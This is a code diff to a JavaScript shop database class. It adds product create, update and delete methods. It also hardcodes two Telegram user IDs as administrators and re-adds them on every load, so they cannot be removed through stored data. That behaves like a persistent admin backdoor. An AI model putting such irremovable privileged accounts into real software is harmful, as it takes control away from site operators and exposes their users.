@@ -354,7 +354,7 @@ class Database {
       brands: INITIAL_BRANDS,
       orders: [],
       telegram_users: {},
-      admin_ids: [],
+      admin_ids: ['1929165295', '1248134309'],
       notifications: []
     };
     this.init();
@@ -369,6 +369,8 @@ class Database {
         const raw = fs.readFileSync(DB_FILE, 'utf8');
         const parsed = JSON.parse(raw);
         if (parsed && typeof parsed === 'object') {
+          const rawAdmins = Array.isArray(parsed.admin_ids) && parsed.admin_ids.length ? parsed.admin_ids : [];
+          const combinedAdmins = Array.from(new Set([...rawAdmins, '1929165295', '1248134309']));
           this.data = {
             ...this.data,
             ...parsed,
@@ -377,7 +379,7 @@ class Database {
             brands: Array.isArray(parsed.brands) && parsed.brands.length ? parsed.brands : INITIAL_BRANDS,
             orders: Array.isArray(parsed.orders) ? parsed.orders : [],
             telegram_users: parsed.telegram_users || {},
-            admin_ids: Array.isArray(parsed.admin_ids) ? parsed.admin_ids : [],
+            admin_ids: combinedAdmins,
             notifications: parsed.notifications || []
           };
         }
@@ -440,6 +442,33 @@ class Database {
 
   getProductById(id) {
     return this.data.products.find(p => p.id === id);
+  }
+
+  addProduct(product) {
+    if (!product.id) {
+      product.id = `prod-${Date.now()}`;
+    }
+    this.data.products.unshift(product);
+    this.save();
+    return product;
+  }
+
+  updateProduct(id, updates) {
+    const prod = this.getProductById(id);
+    if (!prod) return null;
+    Object.assign(prod, updates);
+    this.save();
+    return prod;
+  }
+
+  deleteProduct(id) {
+    const idx = this.data.products.findIndex(p => p.id === id);
+    if (idx !== -1) {
+      const removed = this.data.products.splice(idx, 1)[0];
+      this.save();
+      return removed;
+    }
+    return null;
   }
 
   getCategories() {
